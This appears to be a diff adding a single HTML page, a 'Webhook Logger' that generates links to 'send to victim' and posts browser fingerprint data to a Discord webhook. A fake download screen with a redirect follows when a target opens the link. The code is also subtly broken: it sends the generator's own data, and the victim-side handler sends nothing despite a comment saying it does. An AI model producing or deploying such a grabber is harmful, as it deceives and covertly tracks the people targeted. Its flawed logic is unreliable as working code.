@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Webhook Logger - Grab Logs</title>
+    <style>
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background: #0f0f1a;
+            color: #e0e0ff;
+            padding: 40px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #00d4ff;
+            text-align: center;
+        }
+        .container {
+            background: #1a1a2e;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(0, 212, 255, 0.15);
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 14px;
+            margin: 15px 0;
+            background: #0f0f23;
+            border: 2px solid #444;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(90deg, #00d4ff, #7c00ff);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.25s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.4);
+        }
+        #result {
+            margin-top: 25px;
+            padding: 15px;
+            background: #0f0f23;
+            border-radius: 8px;
+            word-break: break-all;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Webhook Logger</h1>
+        
+        <label for="webhook">Your webhook URL here:</label>
+        <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." autocomplete="off">
+        
+        <button onclick="generateLogger()">GENERATE</button>
+        
+        <div id="result">
+            <strong>Copy this link and send to victim:</strong><br>
+            <span id="downloadLink"></span>
+        </div>
+    </div>
+
+    <script>
+        function generateLogger() {
+            const webhook = document.getElementById("webhook").value.trim();
+            
+            if (!webhook) {
+                alert("Please enter webhook URL first!");
+                return;
+            }
+
+            if (!webhook.startsWith("http")) {
+                alert("Webhook should start with http/https!");
+                return;
+            }
+
+            // Very basic info we grab (you can add much more)
+            const info = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language || navigator.userLanguage,
+                platform: navigator.platform,
+                screen: `${screen.width}×${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
+                referrer: document.referrer || "direct",
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink
+                } : "unknown"
+            };
+
+            const encodedData = btoa(JSON.stringify(info)); // base64 so it's URL-safe
+
+            // This is the link victim will click
+            const fakeDownloadLink = `${window.location.origin}${window.location.pathname}?grab=${encodedData}`;
+
+            // Show result
+            document.getElementById("downloadLink").textContent = fakeDownloadLink;
+            document.getElementById("result").style.display = "block";
+
+            // Auto copy attempt
+            navigator.clipboard.writeText(fakeDownloadLink)
+                .then(() => {
+                    alert("Link copied to clipboard!\nSend this link to your target.");
+                })
+                .catch(() => {
+                    alert("Link generated!\nPlease copy manually:\n\n" + fakeDownloadLink);
+                });
+
+            // === IMPORTANT PART - send data to webhook ===
+            fetch(webhook, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    content: "**New victim just opened the logger!**",
+                    embeds: [{
+                        title: "Victim Information",
+                        color: 0x00d4ff,
+                        fields: [
+                            { name: "Time", value: info.timestamp, inline: true },
+                            { name: "IP", value: "Detected on server side", inline: true },
+                            { name: "User-Agent", value: "```" + info.userAgent + "```" },
+                            { name: "Platform / Screen", value: info.platform + " • " + info.screen },
+                            { name: "Timezone", value: info.timezone },
+                            { name: "Connection", value: info.connection === "unknown" 
+                                ? "unknown" 
+                                : `${info.connection.type} • ${info.connection.downlink} Mbps` 
+                            }
+                        ],
+                        footer: { text: "Basic browser logger • " + window.location.host }
+                    }]
+                })
+            }).catch(() => {}); // silent fail - don't show error to user
+        }
+
+        // If someone opens the generated link → we already sent data on page load
+        window.addEventListener("load", () => {
+            const params = new URLSearchParams(window.location.search);
+            if (params.has("grab")) {
+                // You could make second request here with more info if you want
+                document.body.innerHTML = `
+                    <div style="text-align:center; padding:100px; color:#0f0;">
+                        <h1>Downloading...</h1>
+                        <p style="color:#888;">Your file will start soon...</p>
+                    </div>
+                `;
+                setTimeout(() => {
+                    window.location = "https://example.com/fakefile.zip"; // ← change this
+                }, 1800);
+            }
+        });
+    </script>
+</body>
+</html>
